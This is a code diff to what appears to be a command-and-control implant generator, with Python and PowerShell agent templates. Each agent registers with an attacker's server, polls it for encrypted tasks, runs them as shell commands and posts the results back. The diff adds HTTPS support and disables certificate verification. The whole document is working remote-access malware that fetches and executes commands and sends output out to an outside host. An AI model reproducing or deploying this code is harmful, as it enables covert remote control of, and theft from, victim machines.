@@ -169,12 +169,13 @@ import subprocess
 #encryption libraries
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 _IP_ = 'REPLACE_IP'
 _PORT_ = 'REPLACE_PORT'
 _ID_ = 'REPLACE_ID' 
 _KEY_ = 'REPLACE_KEY'
-
+_SCHEME_ = 'REPLACE_SCHEME'
 
 #add encrytion and decryption FCNs
 def encrypt(task):
@@ -202,12 +203,13 @@ def decrypt(eresult):
 
 if __name__ == "__main__": 
 
-    _C2_ = "http://{}:{}".format(_IP_,_PORT_)    
+    r.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    _C2_ = _SCHEME_ + "://{}:{}".format(_IP_,_PORT_)    
     #Start Registration 
     while (True): 
         seed()
         sleep(randint(0,20)) 
-        response = r.get(url= _C2_ + "/reg/{}".format(_ID_))  
+        response = r.get(url = _C2_ + "/reg/{}".format(_ID_), verify=False)  
         if ("Success" in response.text): 
             break 
         
@@ -218,7 +220,7 @@ if __name__ == "__main__":
     while (True): 
         seed()
         sleep(randint(0,20)) 
-        task = r.get(url= _C2_ + "/task/{}".format(_ID_)) 
+        task = r.get(url = _C2_ + "/task/{}".format(_ID_), verify=False) 
         #add aliases for reverse shell and purging  
         if (task.text): 
             cmd = subprocess.Popen(decrypt(task.text), shell = True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
@@ -231,7 +233,7 @@ if __name__ == "__main__":
                 result = "Task completed but has no output"
             result = encrypt(result)
             
-            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('utf-8')) 
+            r.post(url = _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('utf-8'), verify=False) 
          
         else: 
             continue'''
@@ -302,12 +304,13 @@ $ip = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $id = "REPLACE_ID"
 $key = "REPLACE_KEY"
-$reguri = ("http" + ':' + "//$ip" + ':' + "$port/reg/$id")
+$scheme = "REPLACE_SCHEME"
+$reguri = ($scheme + ':' + "//$ip" + ':' + "$port/reg/$id")
 $name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET').Content
 $name=Convert-ASCII($name)
 if ($name -eq "Success"){
-$taskuri = ("http" + ':' + "//$ip" + ':' + "$port/task/$id")
-$responseuri = ("http" + ':' + "//$ip" + ':' + "$port/task/results/$id")
+$taskuri = ($scheme + ':' + "//$ip" + ':' + "$port/task/$id")
+$responseuri = ($scheme + ':' + "//$ip" + ':' + "$port/task/results/$id")
 for (;;) {
 $n  = Get-Random -Maximum 20
 $task = (Invoke-WebRequest -UseBasicParsing -Uri $taskuri  -Method 'GET').Content
